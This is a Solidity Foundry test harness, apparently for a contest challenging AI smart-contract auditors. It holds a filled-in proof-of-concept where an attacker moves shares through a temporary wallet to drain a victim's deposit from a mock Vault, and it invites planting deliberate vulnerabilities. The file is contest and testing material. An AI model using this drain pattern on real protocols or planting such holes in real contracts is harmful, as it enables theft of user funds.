// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// ─────────────────────────────────────────────────────────────────────────────
// Stump the AI Auditor — PoC Harness Template
//
// Copy this file to `test/PlantPoC.t.sol` (remove the .example suffix), then:
//   1. Modify one of the three base contracts (≤50 lines).
//   2. Implement the TODOs below to demonstrate the exploit.
//   3. `forge test --match-path test/PlantPoC.t.sol -vvv`
//
// This file is GIT-IGNORED once you rename it (the example is tracked; the
// working copy is not) so you can iterate privately. Your final submission
// does NOT need to include this file — but including a PoC as supporting
// evidence often strengthens your writeup.
// ─────────────────────────────────────────────────────────────────────────────

import {BaseTest} from "./helpers/BaseTest.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {console} from "forge-std/console.sol";
// Pick the contract you're attacking and uncomment the import.
import {Vault} from "src/Vault/Vault.sol";
// import {Staking} from "src/Staking/Staking.sol";
// import {Lending} from "src/Lending/Lending.sol";
// import {PriceOracle} from "src/PriceOracle.sol";

contract PlantPoC is BaseTest {
    // ─── Target contract + any test doubles ────────────────────────────────
    Vault internal target;
    // Staking internal target;
    // Lending internal target;

    MockERC20 internal token;
    address internal attacker;
    address internal victim;

    MockERC20 internal usdc;
    MockERC20 internal dai;

    function setUp() public override {
        super.setUp();

        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        target = new Vault(feeRecipient, 2000, 100, 3);
        usdc = deployMockToken("USDC", 6);
        dai = deployMockToken("DAI", 18);

        target.addAsset(address(usdc));
        target.addAsset(address(dai));

        mintAndApprove(usdc, attacker, address(target), 5_000_000e6);
        mintAndApprove(dai, attacker, address(target), 5_000_000e18);
        mintAndApprove(usdc, victim, address(target), 5_000_000e6);
        mintAndApprove(dai, victim, address(target), 5_000_000e18);
    }

    // ─── Your PoC test ──────────────────────────────────────────────────────
    //
    // Write a test that:
    //   1. Sets up normal-looking protocol state (a victim holds shares /
    //      supplies collateral / is staked).
    //   2. The attacker executes a sequence of calls that the plant makes
    //      possible but the base contract would have prevented.
    //   3. Assertions show the fund drain / freeze / insolvency concretely
    //      (balances before vs. after).
    //
    // Use `vm.startPrank(attacker)` to impersonate. Use `vm.warp()` and
    // `vm.roll()` to advance time/blocks. BaseTest provides `advanceSeconds()`
    // and `advanceBlocks()` if you want both at once in realistic ratio.

    function testPoC_exploit_drains_user_funds() public {
        // TODO: 1) Set up a normal deposit / stake / supply from `victim`.
        //       2) Attacker calls the planted path to extract value.
        //       3) Assert attacker balance rose by approximately the victim's
        //          deposit, or total protocol assets fell by ≥ some amount.

        uint256 attackerBalanceBeforeUsdc = usdc.balanceOf(attacker);
        uint256 attackerBalanceBeforeDai = dai.balanceOf(attacker);

        vm.startPrank(victim);
        target.deposit(address(usdc), 1_000_000e6, victim);

        target.requestWithdraw(target.userShares(victim), address(usdc));
        vm.stopPrank();

        vm.startPrank(attacker);
        target.deposit(address(dai), 1000e18, attacker);
        vm.stopPrank();

        address walletTemp = makeAddr("walletTemp");

        vm.startPrank(attacker);
        target.transfer(walletTemp, target.userShares(attacker));
        vm.stopPrank();

        vm.startPrank(walletTemp);
        target.requestWithdraw(target.userShares(walletTemp), address(usdc));

        advanceBlocks(3);

        target.claimWithdraw();
        vm.stopPrank();

        vm.startPrank(victim);
        vm.expectRevert();
        target.claimWithdraw();
        vm.stopPrank();

        uint256 attackerBalanceAfterUsdc = usdc.balanceOf(attacker) + usdc.balanceOf(walletTemp);
        uint256 attackerBalanceAfterDai = dai.balanceOf(attacker);

        assertGt(attackerBalanceAfterUsdc, attackerBalanceBeforeUsdc, "exploit did not drain value");
        assertGt(attackerBalanceBeforeDai, attackerBalanceAfterDai, "exploit did not drain value");

        vm.startPrank(victim);
        vm.expectRevert();
        target.cancelWithdraw();
        vm.stopPrank();

        // Optionally, show the victim lost specifically this amount:
        // uint256 victimShares = target.userShares(victim);
        // uint256 victimClaim = target.convertToAssets(victimShares);
        // assertLt(victimClaim, 1_000e6, "victim's claim not reduced");
    }
}

// https://aiauditor.certik.com/en/scan/ef76a5a0-8991-4c44-9ca4-a4f43abcba73
